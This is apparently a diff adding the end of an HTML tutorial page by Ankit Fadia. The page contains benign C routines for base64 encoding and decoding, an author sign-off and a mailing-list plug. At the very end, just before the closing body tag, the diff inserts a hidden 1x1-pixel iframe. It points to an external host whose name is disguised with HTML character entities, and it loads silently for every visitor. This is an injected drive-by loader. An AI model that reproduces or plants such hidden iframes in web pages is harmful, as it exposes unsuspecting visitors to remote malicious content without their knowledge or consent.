+style="mso-spacerun: yes">    </span><span style='mso-tab-count:1'>            
+    </span>ixtext = 0;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>lentext = gethandlesize (h64);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>ixinbuf = 0;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>while (true) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>if (ixtext &gt;= 
+    lentext)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>break;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>ch = gethandlechar 
+    (h64, ixtext++);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>flignore = false;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>if ((ch &gt;= 'A') 
+    &amp;&amp; (ch &lt;= 'Z'))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>ch = ch - 'A';<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>else if ((ch &gt;= 
+    'a') &amp;&amp; (ch &lt;= 'z'))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>ch = ch - 'a' + 26;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>else if ((ch &gt;= 
+    '0') &amp;&amp; (ch &lt;= '9'))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>ch = ch - '0' + 52;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>else if (ch == 
+    '+')<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>ch = 62;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>else if (ch == 
+    '=') /*no op -- can't ignore this one*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>flendtext = true;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>else if (ch == 
+    '/')<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>ch = 63;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>else<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>flignore = true; <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>if (!flignore) 
+    {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>short ctcharsinbuf = 3;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>boolean flbreak = false;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><span style="mso-spacerun:
+yes"> </span>if (flendtext) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>if (ixinbuf == 
+    0)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><span
+style='mso-tab-count:1'>                </span>break;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>if ((ixinbuf == 
+    1) || (ixinbuf == 2))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><span
+style='mso-tab-count:1'>                </span>ctcharsinbuf = 1;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>else<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><span
+style='mso-tab-count:1'>                </span>ctcharsinbuf = 2;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>ixinbuf = 3;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>flbreak = true;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>}<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>inbuf [ixinbuf++] = ch;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>if (ixinbuf == 4) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>ixinbuf = 0;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>outbuf [0] = (inbuf 
+    [0] &lt;&lt; 2) | ((inbuf [1] &amp; 0x30) &gt;&gt; 4);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>outbuf [1] = ((inbuf 
+    [1] &amp; 0x0F) &lt;&lt; 4) | ((inbuf [2] &amp; 0x3C) &gt;&gt; 2);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>outbuf [2] = ((inbuf 
+    [2] &amp; 0x03) &lt;&lt; 6) | (inbuf [3] &amp; 0x3F);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>origsize = gethandlesize 
+    (htext);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>if (!sethandlesize 
+    (htext, origsize + ctcharsinbuf))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><span
+style='mso-tab-count:1'>                </span>return (false);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>for (i = 0; i &lt; 
+    ctcharsinbuf; i++) <o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                                                
+    </span><span
+style='mso-tab-count:1'>                </span>sethandlechar (htext, origsize 
+    + i, outbuf [i]);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>}<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>if (flbreak)<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                                </span>break;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>}<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>} /*while*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>exit:<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>return (true);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*decodeHandle*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>void 
+    base64encodeVerb (void) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>Handle h64, htext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>short linelength;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>if (!IACgettextparam ((OSType) 
+    keyDirectObject, &amp;htext))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>return;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>if (!IACgetshortparam ((OSType) 
+    'line', &amp;linelength))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>return;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>h64 = NewHandle (0);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>if (!encodeHandle (htext, h64, 
+    linelength))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>goto error;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>DisposHandle (htext);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>IACreturntext (h64);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>return;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>error:<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>IACreturnerror (1, &quot;\perror 
+    encoding the Base 64 text&quot;);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*base64encodeVerb*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>void base64decodeVerb (void) {<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>Handle h64, htext;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>if (!IACgettextparam ((OSType) keyDirectObject, &amp;h64))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>return;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>htext = NewHandle (0);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>if (!decodeHandle (h64, htext))<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                                </span>goto error;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>DisposHandle (h64);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>IACreturntext (htext);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>return;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>               
+    </span>error:<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span><span style='mso-tab-count:1'>                
+    </span>IACreturnerror (1, &quot;\perror decoding the Base 64 text&quot;);<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style='mso-tab-count:1'>                </span>} /*base64decodeVerb*/<o:p></o:p></span></font><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><o:p></o:p></span></font><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">  </span>------------------------------------------<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>Well, that is all for now. Hope you liked the 
+    manual. Bye.<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'>Ankit 
+    Fadia<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><a
+href="mailto:ankit@bol.net.in">ankit@bol.net.in</a><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><a
+href="http://hackingtruths.box.sk/">http://hackingtruths.box.sk</a><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'>To 
+    receive tutorials on EVERYTHING YOU DREAMT of written by Ankit Fadia in your 
+    Inbox, join his mailing list, by sending a blank email to: <a
+href="mailto:programmingforhackers-subscribe@egroups.com">programmingforhackers-subscribe@egroups.com</a></span></font></p>
+</div>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+
+</html>
